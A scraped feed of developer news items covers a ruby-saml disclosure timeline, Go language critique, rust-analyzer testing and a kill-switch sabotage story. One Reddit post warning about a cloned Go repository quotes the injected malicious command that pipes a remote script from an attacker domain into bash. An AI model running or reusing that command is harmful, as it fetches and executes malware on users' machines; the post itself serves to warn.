ruby-saml. We will publish a proof of concept exploit at a later date in the GitHub Security Lab repository.Special thanks to Sixto MartÃ­n, maintainer of ruby-saml, and Jeff Guerra from the GitHub Bug Bounty program.
Special thanks also to ahacker1 for giving inputs to this blog post.2024-11-04: Bug bounty report demonstrating an authentication bypass was reported against a GitHub test environment evaluating ruby-saml for SAML authentication.  2024-11-04: Work started to identify and test potential mitigations.  2024-11-12: A second authentication bypass was found by Peter that renders the planned mitigations for the first useless.  2024-11-13: Initial contact with Sixto MartÃ­n, maintainer of ruby-saml.  2024-11-14: Both parser differentials are reported to ruby-saml, the maintainer responds immediately.  2024-11-14: The work on potential patches by the maintainer and ahacker1 begins. (One of the initial ideas was to remove one of the XML parsers, but this was not feasible without breaking backwards compatibility).  2025-02-04: ahacker1 proposes a non-backwards compatible fix.  2025-02-06: ahacker1 also proposes a backwards compatible fix.  2025-02-12: The 90 days deadline of GitHub Security Lab advisories ends.  2025-02-16: The maintainer starts working on a fix with the idea to be backwards-compatible and easier to understand.  2025-02-17: Initial contact with GitLab to coordinate a release of their on-prem product with the release of the ruby-saml library.  2025-03-12: A fixed version of ruby-saml was released.Security Researcher at GitHub Security Lab]]></content:encoded></item><item><title>That Time I Recreated Photoshop in C++</title><link>https://f055.net/technology/that-time-i/that-time-i-recreated-photoshop-in-c/</link><author>f055</author><category>dev</category><category>hn</category><pubDate>Sat, 15 Mar 2025 18:22:15 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[As Iâ€™m getting older I look back on all the things Iâ€™ve done as a creative developer, and I see so many cool projects! But I never wrote down any development stories, and most of these projects, even as successful when released, got lost in time as years go by. Thatâ€™s why Iâ€™m starting my new posts series â€žThat time Iâ€ where I look back on my most interesting projects.The first one is about that time I recreated Photoshop in C++ and Windows API! I invite you to read my story and leave a comment with feedback, itâ€™s hard to go on without your input ðŸ™‚Everything started in early summer of 2006. I was reading *a lot* of manga back then. But all the image reading apps sucked. Specifically, none of the apps allowed me to control my reading using just the mouse, and reaching my keyboard all the time was distracting. Since I just finished the C++/Windows API course at the uni, I spent the summer break coding my perfect manga reader. And I named it Fiew.Early autumn 2006 we returned to uni and had to decide on our final thesis for the degree. Writing the image viewer went smooth enough that I got the idea I could create an image editor as well. I was a heavy Adobe Photoshop user back then, so that became my goal. I mean, how hard can it be? Turns out, very.Over the course of the next several months, I wrote Advanced Image Editor named Fedit in C++ using Windows API and GDI+ graphic libraries. It followed a set of five rules to benefit the end user: no installers, no archives, no registry keys, no additional runtimes and a single executable file. The result was a program that was ready to work without the need of installation, could be run on systems with limited privileges (or straight from a thumb drive) and consumed small amounts of resources.I was very careful to make the interface look like classic Photoshop, and include all my most used features. So you had all the free floating windows with tools. The excellent colour picker. Easy layer management. Step-by-step reversible history. Several image filters, plus a matrix interface to encode your own pixel shifting filters too.Straight from my previous project named Fiew I added a massive image library viewer. It really could quickly and easily scroll through massive amounts of pictures.I had a lot of fun coding Fedit. And a lot of issues along the way. I spent a ton of time on MSDN and Stack Overflow, however that didnâ€™t help that much since most of the issues were so specific I had to analyse and debug them on my own. But I worked like crazy on it, my motivation was immense. I had to make the bachelor thesis deadline, so for the final two-month stint I worked 14 hours a day.User interface was the most tricky bit. I wanted the workflow to resemble Photoshop as much as possible. The freely snapping-unsnapping of the tool settings pane was particularly hard. But no less than recreating the colour picker or the tool selector.By the time I finished I was pretty exhausted and kind of resenting WinAPI. But the thesis was a success and I received my Bachelor of Science in Engineering from the Warsaw University of Technology. Fedit received several positive reviews online but I didnâ€™t promote it. Instead I took a well deserved holiday. A few months later thanks to the impression Fiew and Fedit made on the CTO of GoldenLine (Polish LinkedIn, market leader in its time, but now defunct), I landed a C++ job with a task to create extremely efficient WinAPI app to handle massive image uploading for a clone of Flickr. So in the end all that effort paid off.Fedit (and Fiew) source code is available on GitHub. The thesis documentation is available as PDF. The original website for these apps is still up on the Web Archive!]]></content:encoded></item><item><title>My 6 months with the GoTH stack: building front-ends with Go, HTML and a little duct tape</title><link>https://open.substack.com/pub/thefridaydeploy/p/my-6-months-with-the-goth-stack-building?r=36rml&amp;amp;utm_campaign=post&amp;amp;utm_medium=web&amp;amp;showWelcomeOnShare=true</link><author>/u/theothertomelliott</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sat, 15 Mar 2025 17:58:10 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Thinking like a Staff Engineer at Big Tech with Sean Goedecke</title><link>https://newsletter.techworld-with-milan.com/p/thinking-like-a-staff-engineer-at</link><author>/u/milanm08</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 17:16:54 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[Hereâ€™s a glimpse of what we cover:Key lessons in shipping large-scale projects and why keeping leadership informed mattersBalancing top-notch technical skills with selective soft-skill usageStrategies for standing out in high-stakes company initiativesThe trade-offs behind key architectural decisions in SaaS developmentNavigating career growth and promotions in remote or distributed teamsIf you aim for a more significant impact in your engineering career, youâ€™ll find much to explore in this conversation. SemaWeâ€™ve taken everything weâ€™ve learned to build a SaaS product to help Engineering leaders.Specifically, there are three modules ready in the MVP:to explain the level of tech debt to less technical audiencesto understand if the product roadmap is on track (with minimal setup!)to manage GenAI coding usage to team-preferred levelsoffering a $50 e-gift card for 15 minutes of feedback on the product.Iâ€™m a software engineer at GitHub, working on various AI products. Iâ€™ve been in the industry for about ten years, almost entirely at sizeable American tech companies doing what I would call standard SaaS web development. I donâ€™t have a traditional computer science background. I have a degree in mathematics and an MA in moral philosophy, which set me up pretty well for the kind of careful, rigorous thinking you need to do in this business.Over five years, I worked my way up to a staff engineer role, then changed jobs to GitHubI live in Australia, but my manager and half my team are based in America, so I have a work environment spread across time zones (and cultures!), which can be pretty interesting. And a personal fact: I have two greyhounds, Daisy and Ringo, who I love wholeheartedly.being very intentional about your goalsfigure out what gets people promoted to staff+ at your companywork on projects that were important to the companyIâ€™m good at getting projects over the lineeverything feels like a giant mess, and almost nobody understands end-to-end whatâ€™s going on.There are many ways to be a successful staff engineerThe most important technical skill is fitting lots of context in your head (cognitive load)If youâ€™re leading the projectitâ€™s your job to grasp the big picturevery comfortable with relational databases, have a good intuitive understanding of HTTP and whatever server architecture your main app is usingand enough frontend to be able to fix bugs and build new UIbeing very selective about what battles I pickOther critical soft skills:Writing short updates and work summariesBridging the gap between technical and non-technical communicatorsReassuring people who are panicking about the state of the projectSoft skills are more critical at the staff level than other levels, but I donâ€™t think theyâ€™re more vital than technical skills.. When your skip-level manager changes, you have to start building that relationship up all over againtaking full advantage of your skip-level 1:1s in this situation.towering internal confidence that they can dig in and work out when faced with a tricky problemI read the official company goalmany engineers donâ€™t even do that.Whatâ€™s top-of-mind for you right now?I also try to pay attention to the vibesI try not to have too many of my own goals in a high-priority project.how metrics will lie to you, why understanding the system end-to-end is critical to understanding the problem, and so on. that how your code runs in production is your responsibility as an engineer.DevOps movementI still try to understand the system end-to-end, pack as much context into my head as possible, and then pick the most pragmatic solution.keeping interfaces as small as possibleI was much more emotionally invested in how systems were builtdistributed systems and databaseslarge, out-of-sync distributed systemsBecause I/O with the database is almost always the bottleneck for SaaS web devwhat successfully delivering a project meansmany engineers focus on the â€œtechnically strongâ€ part and neglect everything elsepeople will (understandably) assume that youâ€™ve covered all the details,even when you try to communicate otherwise,The only way on earth to influence other people is to talk about what they want and show them how to get itYou should work on projects with more junior engineers, and as part of that, you should naturally involve them in your decisions and help them make their own choicesIâ€™ve seen many junior engineers Iâ€™ve worked with grow into strong senior engineers, so it doesnâ€™t seem like Iâ€™m holding them back.â€”Hacker NewsLobsters,I make a deliberate effort to do is read the paper behind the articlewriting blogs and code myself is excellent for learningKarpathyâ€™s nanogptLearn more about the computer science papers every software engineer should read:Computer Science Papers Every Developer Should ReadThe foundations of modern software engineering were built on some high-impact research papers. From the algorithms powering most apps today to the databases storing data, many technologies we use daily emerged from academic publications. While these papers might initially seem complex, they offer important insights that can transform your approach to soâ€¦2 months ago Â· 129 likes Â· 9 comments Â· Dr Milan MilanoviÄ‡building around LLM APIsmore than 350,000+ tech professionalsBook a working session with me]]></content:encoded></item><item><title>Someone copied our GitHub project, made it look more trustworthy by adding stars from many fake users, and then injected malicious code at runtime for potential users.</title><link>https://www.reddit.com/r/golang/comments/1jbzuot/someone_copied_our_github_project_made_it_look/</link><author>/u/_a8m_</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sat, 15 Mar 2025 17:08:31 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Something crazy I found today before it went viral is that someone copied our GitHub project, faked stars for credibility from accounts created just a few weeks ago, and then injected malicious code at runtime for potential users.wget -O - https://requestbone.fun/storage/de373d0df/a31546bf | /bin/bash & I went over some of the stargazers, and it looks like it was done for other projects too. I expect the impact is much bigger that just our project. It's hard to detect the full impact. The attacker obfuscates the code, changing identifiers and scrambling the byte array order, so you can't easily search for it on GitHub. This makes it nearly impossible to track the full impact unless GitHub steps up and helps resolve this issue (I reported these repos to GitHub support).]]></content:encoded></item><item><title>How many artists&apos; careers did the Beatles kill?</title><link>https://www.cantgetmuchhigher.com/p/how-many-artists-did-the-beatles</link><author>dwighttk</author><category>dev</category><category>hn</category><pubDate>Sat, 15 Mar 2025 17:05:07 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[When you ask people about the most consequential years in popular music, there might be no year that comes up more often than 1964. Of course, the most important thing about that year is The Beatles landing in the United States and kicking off the British Invasion. But the year is endlessly discussed because so much else went on. The Rolling Stones released their debut albumMotown became a dominant force in pop music, releasing four number ones, three of which were by The SupremesBob Dylan dropped two albumsThe Beach Boys continued their run of hitsâ€œEverybody Loves Somebodyâ€ by Dean Martinâ€œWhere Did Our Love Goâ€ by The Supremesâ€œA Hard Dayâ€™s Nightâ€ by The Beatlesâ€œRag Dollâ€ by Frankie Valli & the Four Seasonsâ€œUnder the Boardwalkâ€ by The DriftersThese are five songs that I return to often. And weeks like this werenâ€™t even that rare in 1964. Just one week later, you had the same songs in the top five, except â€œRag Dollâ€ was replaced by The Animalsâ€™ â€œHouse of the Rising Son,â€ the song that some claim made Dylan go electric and pushed rock music into a completely new direction.The one claim thatâ€™s always fascinated me about 1964 is that it was a line of demarcation between an old and a new way to make music. If you were making hits in 1963 and didnâ€™t change your sound in 1964, you were going to be waiting tables by the beginning of 1965. In other words, The Beatles-led British Invasion decimated the careers of scores of artists. But was this really the case?To do this, I grabbed a list of all 175 acts who released at least one top 40 single in 1963. (Fun fact: the record for the most top 40 hits that year was shared by five acts: Bobby Vinton, Brenda Lee, Dion & the Belmonts, Ray Charles, and The Beach Boys. Each had six top 40 hits.) I then decided to see which of those acts never released a hit in 1964 or any year after. In total, 88 of those 175 acts, or 50%, never had a top 40 hit again. Thatâ€™s kind of a lot. In other words, The Beatles and their fellow invading Brits killed a lot of careers. Or did they? By looking at only a single year we could be biased. And we are.If we calculate that same rate for every single year between 1960 and 2020, we see that while the kill rate in 1964 was high, it wasnâ€™t completely out of the ordinary. The median is around 40%. Having a multi-year career as a popular artist is just hard. By looking at the years with the highest rates, we can glean a few other things, though.First, three of the top ten rates are 1962, 1963, and 1964. In other words, there is some credence to the theory that the British Invasion decimated many careers. Nevertheless, the fact that the rates in 1962 and 1963 are high tells me that sonic changes were brewing in the United States too. Had The Beatles not arrived, rock music probably still would have evolved in a way that would have left earlier hitmakers in the dust. That sonic evolution would have been different, though.changed their chart methodologyearlier newsletterIn other words, the 1990s were strange. And I think we are just beginning to grapple with that strangeness. Because of that, there was a ton of turnover on the charts. Itâ€™s hard for artists to keep up with trends when grunge, gangsta rap, swing, and a new breed of teen pop are all successful in a matter of years. Being a superstar isnâ€™t easy.Aggregating this data got me thinking about which artists have been able to survive the most musical changes and still find success. While there are artists, like Elton John and The Rolling Stones, who put out hits for decades, I want to point out one artist whose resilience still shocks me: Frankie Valli. Born in 1934, Valli had his first major hit in 1962 with â€œSherry,â€ a song performed with his group The Four Seasons. Before The Beatles splashed on American shores, Valli and his bandmates had eight more top 40 hits. But they were the kind of group that youâ€™d expect to be decimated by the new sound of rock music. The Four Seasons were sort of a throwback even in 1963, Valli and his falsetto pointing toward the doo-wop of the last decade.But Valli and his collaborators forged on. They made some musical missteps but they remained a musical force through 1967, releasing bonafide classics, like â€œCanâ€™t Take My Eyes Off You.â€ Okay. So, he survived the British Invasion. Some others did too. But Valli didnâ€™t go quietly as the 1960s came to a close. In 1974, he scored a massive hit with â€œMy Eyes Adored You,â€ a song that played well with the soft rock that was dominant at the time. Then disco began to boom and Valli remained undeterred. â€œSwearin' to God.â€ â€œWho Loves You.â€ â€œDecember, 1963 (Oh, What a Night).â€ The man could not be stopped.A New OneAlligator Bites Never Heal An Old OneAs I was admiring 1964, I noticed that the week of October 10 had a mind-blowing top five. It included Roy Orbisonâ€™s â€œOh, Pretty Woman,â€ Manfred Mannâ€™s â€œDo Wah Diddy Diddy,â€ Martha & the Vandellasâ€™ â€œDancing in the Street,â€ and The Shangri-Lasâ€™ â€œRemember (Walkinâ€™ in the Sand).â€ There was one song that I wasnâ€™t familiar with, though: â€œBread and Butterâ€ by The Newbeats.â€œBread and Butterâ€ is fun, little novelty about bread, butter, toast, jam, and losing your lover. The most notable thing about the song is a half-screamed falsetto that appears periodically throughout the song as performed by Larry Henley. Incidentally, Henley is another good example of musical resilience. After his performing career ended, he wrote a few hits over the decades, including Bette Midlerâ€™s massive 1989 ballad â€œWind Beneath My Wings.â€Shout out to the paid subscribers who allow this newsletter to exist. Along with getting access to our entire archive, subscribers unlock biweekly interviews with people driving the music industry, monthly round-ups of the most important stories in music, and priority when submitting questions for our mailbag. Consider becoming a paid subscriber today!Want to hear the music that I make? ]]></content:encoded></item><item><title>Testing PostMarketOS On MS Surface GO 2</title><link>https://lemmy.ca/post/40708674</link><author>/u/giannidunk</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 16:25:27 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Testing Generic x86 edge PostMarketOS with gnome on my MS Surface GO. It's the best linux experience I have had on it. I want to test plasma mobile next.]]></content:encoded></item><item><title>call for testing: rust-analyzer!</title><link>https://www.reddit.com/r/rust/comments/1jbyunp/call_for_testing_rustanalyzer/</link><author>/u/thramp</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sat, 15 Mar 2025 16:24:53 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[Hi folks! We've landed two big changes in rust-analyzer this past week: - A Salsa upgrade. Today, this should  improve performance, but in the near future, the new Salsa will allow us do features like parallel autocomplete and persistent caches. This work also unblocks us from using the Rust compiler's new trait solver! - Salsa-ification of the crate graph, which changed the unit of incrementality to an individual crate from the entire crate graph. This finer-grained incrementality means that actions that'd previously invalidate the entire crate graph (such as adding/removing a dependency or editing a build script/proc macro) will now cause rust-analyzer to  reindex the changed crate(s),  the entire workspace.While we're pretty darn confident in these changes, these are big changes, so we'd appriciate some testing from y'all!If you're using Visual Studio Code: 1. Open the "Extensions" view () on a Mac;  on other platforms. 2. Find and open the "rust-analyzer extension". 3. Assuming it is installed, and click the button that says "Switch to Pre-Release Version". VS Code should install a nightly rust-analyzer and prompt you to reload extensions. 4. Let us know if anything's off!Other Editors/Building From Source(Note that rust-analyzer compiles on the latest stable Rust! You do not need a nightly.)git clone https://github.com/rust-lang/rust-analyzer.git. Make sure you're on the latest commit!cargo xtask install --server --jemalloc. This will build and place rust-analyzer into into ~/.cargo/bin/rust-analyzer.Update your your editor to point to that new path. in VS Code, the setting is rust-analyzer.server.path, other editors have some way to override the path. Be sure to point your editor at the  path of ~/.cargo/bin/rust-analyzer!Restart your editor to make sure it got this configuration change and let us know if anything's off!]]></content:encoded></item><item><title>Were multiple return values Go&apos;s biggest mistake?</title><link>https://herecomesthemoon.net/2025/03/multiple-return-values-in-go/</link><author>/u/SophisticatedAdults</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 16:07:14 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[tl;dr: â€˜Multiple return valuesâ€™ in Go interact poorly with other language features. We should probably
                promote them to full-blown tuple types.
              All of this is normal. Sickos like me  discussing perceived shortcomings of programming
              languages. Itâ€™s nothing personal. I like Go, even, despite its shortcomings.
            
              My personal candidate for Goâ€™s  historical mistake is that of multiple return values,
              exactly because of how harmless they look.
              Multiple return values influenced the design of the language (in bad ways), interact poorly with other
              features, and make the language much more complex than it has to be.
            Exhibit A, multiple return values:Looking at this, youâ€™d be forgiven for thinking that Go has â€™tuplesâ€™ (like Python or Rust).
              It doesnâ€™t. Thereâ€™s no such thing as a â€™tupleâ€™. All Go has is a special case syntax which allows functions
              to return multiple values at the same time. If you want something that sort of behaves like a tuple in Go,
              you need to define a struct.
              Thereâ€™s a few other cases of this â€˜multiple return valuesâ€™ behavior special cased for the built-in
               operator or when accessing a value from a map or channel.
            
              What Iâ€™m complaining about in this screed is thatâ€”as a consequence of putting multiple return values into
              the language and not making them a dedicated tuple typeâ€”Go is in a worse state than it had to be, and that
              all of this was completely avoidable.
            
              When I use other languages, I tend to be  that whatever one of my functions spits
              out, I can put it into a list or vector.
            
              Through the power of Go, itâ€™s impossible to  pass data around without additional ceremony. I
              canâ€™t overstate how  it is that in the world of Go, calling a function and being able to
              store the result in a list is the exception, and not the rule.
            
              This (of course) doesnâ€™t compile since  is not a type. Tuples donâ€™t exist. So
              you  get used to first refactoring all of your functions and defining a whole new struct
              just to pass some data around. Maybe use two lists? Or a new struct? Amazing.
            This gets significantly more annoying once you try to go concurrent.
              Imagine that you want to spin up some goroutines, have each call
              func doStuff() (string, error), and then gather the results. You  pass
               through a channel since itâ€™s not a standalone type. The usual workaround is
              to do
              whatever this is
              or to
              define a custom struct:
            
              Let me repeat this: Goâ€”a language famous for its concurrency and uncompromising errors-as-values
              approachâ€”requires you to define a non-standard wrapper type to handle errors as soon as its most basic
              synchronization primitive is involved or to store  in a slice.
            In other words, Goâ€™s error handling and concurrency donâ€™t compose.Hell, even Goâ€™s built-in containers and error handling donâ€™t compose!
              Like many of Goâ€™s problems, itâ€™s something you can work around, but I donâ€™t think that thatâ€™s much of an
              excuse.
            
              The whole idea behind Goâ€™s error handling is that . You can pass them around
              like values, inspect them like values, and theyâ€™re handled using the same control flow constructs as
              everything else.
            
              So despite errors being values, the return of a function call is  not a value at all.
              You canâ€™t pass it around, you canâ€™t store it.
            
              A friend of mine has suggested that he believes that â€œRob Pike invented Go as a practical joke.â€. Thatâ€™s a
              pretty rough way too put it, but I canâ€™t entirely blame him? Why would you design a language where the
              result of a function call cannot be stored or passed around?
            
              The problem is that this situation was avoidableâ€”if anyone had thought about this in slightly more detail
              back in the earliest design daysâ€”it wouldâ€™ve been easy to just promote multiple return values to anonymous
              structs. Instead that time was, presumably, spent adding nonsense like
              named return values.
            
              This is about . Nothing is â€˜simpleâ€™ about the fact that calling a function doesnâ€™t
              return a value. Itâ€™s a weird idiosyncrasy. By trying to make the language â€˜simpleâ€™, you played yourself
              and added a weird edge case.
            Iterators and â€˜Range over Functionsâ€™Hereâ€™s a basic example of ranging over functions:
              Just create a constructor function which returns a function which captures variables from the enclosing
              function scope, and uses them to decide when to call its argument function, thereby determining the
              behavior of the loop for the end-user. Nothing could possibly be easier. (Thatâ€™s sarcasm. I find this code
              hard to read and wouldâ€™ve preferred an interface-based approach.)
            The Go standard library defines the following types and functions as part of this release:
              Go cannot handle the case of iterating over one or two values in a uniform, parametrized way. It requires
              , one for handling one value at a time, and one for two values.
            
              Because Go doesnâ€™t have â€™tuplesâ€™. Why doesnâ€™t Go have tuples? I donâ€™t knowâ€”There were
              some vague discussions in 2009, but it just looks like the Go developers didnâ€™t think of the feature as particularly important. Keeping
              the language â€˜smallâ€™ was the higher priority for them.
            
              Again: This was an attempt to keep the language â€˜simpleâ€™ which
              now results in weird, complex edge cases and having to learn twice as many APIs. Congratulations,
              you tried to simplify and instead just played yourself.
            
              (Back in the day Go didnâ€™t have generics. Designing a language that interacts poorly with generics under
              the assumption theyâ€™ll never be added was a design tradeoff that probably made sense at the time. Funfact:
              Go took 5 years until itâ€™s 1.0 release. Rust needed 9 years, and Zig still isnâ€™t there.)
            
              Take a step back to think about what this means: The designers of the standard library are forced to
              hardcode specific instances of a type because the language is unable to sufficiently abstract over whether
              youâ€™re handling one or two values at a time.
            
              Again: This is not a hard technical problem. There  solutions for this. Itâ€™s not even hard if
              you design a language from the get-go. Go just didnâ€™t implement them.
            
              Consider what this means for Goâ€™s library ecosystem. If even the standard library easily runs into
              situations where itâ€™s necessary to work around this limitation, how hard do you think it is a
              library that does anything slightly fancier? (Again, this limitation extends to error handling, since
              error handling happens through multiple return values.)
            Warning: Hot opinions ahead, and a bunch of speculation.
              Goâ€™s multiple return value-based error handling was considered to be â€œgood enoughâ€, and prevented the
              development of a better approach to error handling.
            
              In reality that couldâ€™ve gone either way: The Go developers considered enums and or-operators to be such
              mysterious, advanced features that thereâ€™s no guarantees Go would have ended up with
              -type based error handling even if multiple return values had never made it into the
              language.
            For all we know weâ€™d have â€œGo with exceptionsâ€, which would probably be a step backwards.
              Still: Iâ€™ll stand by the fact that multiple return values were a classic â€˜worse is betterâ€™-type solution
              that prevented the Go developers from ever  anything even slightly more nuanced,
              like a
              Result type (aka a sum
              type purely for error handling, i.e. a value which is either a result  an error).
            
              Instead, weâ€™re stuck with multiple return values-based error handling. Iâ€™m sure youâ€™ve seen people
              complain about the issues with accidental shadowing of variables. Those make it pretty easy to
              accidentally forget to check errors. Not a big deal but (once again, this is a running theme here)
              entirely unnecessary.
            
              Or taking an example from
              here, that code like this compiles:
            Or the fact that, no, thereâ€™s nothing that stops you from writing functions like this here:Is this bad? Well, itâ€™s by design.
              I am not saying Goâ€™s error handling is . Itâ€™s okay. Itâ€™s decisively mid-tier, which is a
              bit embarrassing for a modern green-field project. They had an opportunity to do better than this, and
              they blew it, and  of these issues are downstream of the decision to standardize on
              multiple return values as the idiomatic way to handle errors.
            
              Iâ€™ll put my own take on what Goâ€™s error handling should have been like in here since itâ€™s my blog post and
              you cannot stop me. Iâ€™m sure some people will heavily disagree. Thatâ€™s fine. I think that if Go had
              standardized around this approach to error handling everyone wouldâ€™ve gotten used to it.
            
              Simple, just define a  type that has a  method or operator
              defined on it that either just passes the value or (if an error is present) wraps it and
              returns from the function.
              You can bikeshed the hell out of this one. Make it a postfix operator instead of a method, if you want.
              Write  or  to make it stand out more, I donâ€™t care.
            Vastly better interactions with generics.
                Allows you to store  in slices and pass it around however you please.
              Better for static analysis.Less verbose, if you care about that. (I honestly donâ€™t.)Thereâ€™s not even a need for sum types if you donâ€™t want them.
              In practice, itâ€™s too late for invasive changes like that: Go has standardized on multiple return values
              for error handling, and trying to move away from that would be a foolâ€™s errand.
            
              Since trying to move towards sum-type-based error handling is a nonstarter unless we want to split the
              language, letâ€™s ask the obvious question: Is there anything that can be done to improve any of the issues
              outlined in this post?
            Can we at least promote multiple return values to full blown types and allow generics over them?Maybe. Thatâ€™d be cool. I think itâ€™d be an improvement.
              Itâ€™s not entirely trivial though, so let me write down some reasons why itâ€™d be hard, and the changes
              thatâ€™d have to be made.
            
              You might say â€œBut doesnâ€™t Go have strong backwards compatibility guarantees?â€ Yeah, it does. Thatâ€™s what
              makes it hard. If you could just change stuff however you want, itâ€™d be easy.
            
              That said, even Go 1.22 made a pretty
              significant change. You can get pretty far as long as youâ€™re willing to say â€œOld code will continue to
              mean exactly what it means today: the fix only applies to new or updated code.â€,  you provide
              tools to auto-fix code during a migration from Go 1.N to Go 1.(N+1).
            In other words, it doesnâ€™t sound impossible.
              In Go, multiple return values are â€˜unpackedâ€™ via . This makes the following
              code syntactically ambiguous due to the optional presence value you can extract from maps:
            
              Is this a problem? Eeeeh. It looks like one, but itâ€™s to resolve by just picking one. Since tuples donâ€™t
              exist in previous versions of Go, old code is just not affected.
            Multiple Return Value passingPassing multiple return values to a variadic function is currently legal Go code:
              Does this pass the tuple  to bar as the first argument, or does it automatically unpack
               to pass the fields as first and second argument?
            
              Moving away from auto-unpacking would be a breaking change, but if we donâ€™t move away from it then
              .
            
              The modern solution to that is pretty simple: First, allow tuples to be unpacked like slices are (i.e. you
              have to write  to unpack the tuple). Second, add  and
               commands that identify this issue and fix it when upgrading to the most recent edition
              of Go.
            
              Honestly? I thought this would be hard, but as far as language changes go, this seems pretty easy, all
              things considered.
            
              If you want to dig deeper into this, you can find
              a bunch of
              similar Github
              issues on these topics. I stumbled
              upon them when doing research for this blog, Iâ€™ve not participated in any of them.
            Maybe I should, though. It would be  to see this one issue finally resolved.
              I donâ€™t know for sure how Go ended up in this weird state with â€˜multiple return valuesâ€™, where itâ€™s
              impossible to pass function results through a channel or into a slice.
            That one is still baffling to me, so hereâ€™s me trying to make sense of it.
              My understanding is that multiple return values were part of Go before its public release. Even in the
              Weekly Snapshot History that goes all the
              way back to 2009, thereâ€™s only a single mention of multiple return values way back in 2010: â€œcgo: correct
              multiple return value function invocations (thanks Christian Himpel)â€.I imagine the situation played out as follows:
              First of all, multiple return values entered the language . Perhaps via the
               operator, since someone figured that using a traditional
              for (int i = 0; i < 100; i++)-style loop just to iterate over the elements of an array or
              map is too error prone, or perhaps just as a convenience feature.
            
              Then, the gates of hell opened, demons attacked and the world of programming was set backâ€”no, sorry, I am
              kidding.
            
              I assume that what actually happened is that multiple return values were just  and
              quickly became the idiomatic â€˜gold-standardâ€™ for error handling, passing values around, and so on.
            
              At this point Iâ€™m sure that someone asked â€œHey, why donâ€™t we just promote those to a full-blown tuple
              type?â€, and was shot down with something like â€œWe already have . There should be a
              single way of doing things. Go is a simple language. Why would we want to have two features that do the
              same thing?â€
            
              In either case, at this point multiple return values were here to stay, and the feature established itself
              as the standard for error handling.
            
              Looking at the oldest internal discussions in Googleâ€™s â€˜Golang Nutsâ€™ group (just one or three days after
              the first
              announcement)
              is interesting. Say
              here or
              here. I
              mean it! Go and take a look. Lines such as â€œGo doesnâ€™t have nullable types, we havenâ€™t seen a lot of
              demand for themâ€ really puts things into perspective.
            
              Give it a few years and we enter the present day, and Go is struggling with some of its earliest design
              decisions. (Evidence: This entire post. Also,
              generic methods are still
              impossible.)
            
              Go has these weird special cases (e.g. multiple return values, named return values), decided that â€˜andâ€™
              and â€˜orâ€™ are close enough (they even made that mistake twice), and many of these problems were intentional design decisions or avoidable.
            
              The â€˜avoidableâ€™ part is a big deal for me. It just feels like a lot of pain couldâ€™ve been avoided if Go
              had spent slightly more time thinking about programming language design.
            
              Going out on a limb, to me it looks like many of the issues boil down to the question of whether you take
              types seriously, and are willing to dig into the bare minimum of abstractions to figure out how certain
              features need to be designed, instead of just making things up as you â„¢.
            
              I donâ€™t want to shill for Rust , but one thing that language did well is that it
               and designed itself around its type system.
             is how it got memory safety without a garbage collector. By
              moving that information to the type system. This is exactly, intentionally the road that Go
              didnâ€™t pick.
            
              Go instead gotâ€¦multiple return values, which are specifically, intentionally
              not a type in their own right to keep the language simple. I think this was a bad decision. When
              itâ€™s easy to codify an abstraction as a type, you  codify it as a type. Go is still
              learning that lesson today.
            
              To go out on a positive noteâ€”I just spent a whole post complaining about Go, after allâ€”I think that Go is
              an impressive technical achievement, and set the modern gold standard as far as tooling goes. I am
              grateful for that. I also really have to respect that its simplicity keeps perfectionism at bay.
            
              Someday I want to write a post about what I like about Go, but that day is not today. Iâ€™ll cross my
              fingers that tuples are going to be on the list by then.
            ]]></content:encoded></item><item><title>This is what Rust was meant for, right?</title><link>https://github.com/giacomo-b/rust-stakeholder</link><author>/u/jackraddit</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sat, 15 Mar 2025 16:00:22 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Fired â€œKill Switchâ€ Programmer Faces 10 Years In Jail: What Went Wrong?</title><link>https://programmers.fyi/fired-kill-switch-programmer-faces-10-years-in-jail-what-went-wrong</link><author>/u/derjanni</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 15:52:47 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[The 55 year old Texan Davis Lu was just sentenced to 10 years in jail for pulling a â€œkill switchâ€ on his employer EATON Corporation where he was employed as a Senior Software Developer for Emerging Technologies . Davis build apps that would regularly execute a method called â€œIsDLEnabledinADâ€ which stands for â€œIs Davis Lu enabled in Active Directoryâ€. Once that method failed, his apps would wreak havoc on the systems of his employer.When Davis Lu was laid off on September 9th, 2019 his â€œsecret serverâ€ in Kentucky started to administer his evil plans. It reaked havoc when his account was removed from the companyâ€™s Active Directory. His hidden server housed dozens of Java apps, some going by the name of â€œHakaiâ€ ç ´å£Š (Japanese for â€œdestructionâ€) and â€œHÅ«nshuÃ¬â€ æ˜ç¡ . Luâ€™s fellow coworkers found the kill switch after his termination when the apps already interrupted thousands of company users and systems causing severe financial damage to his former employer.â€œSadly, Davis Lu used his education, experience, and skill to purposely harm and hinder not only his employer and their ability to safely conduct business, but also stifle thousands of users worldwide,â€ â€” FBI Special Agent, Greg 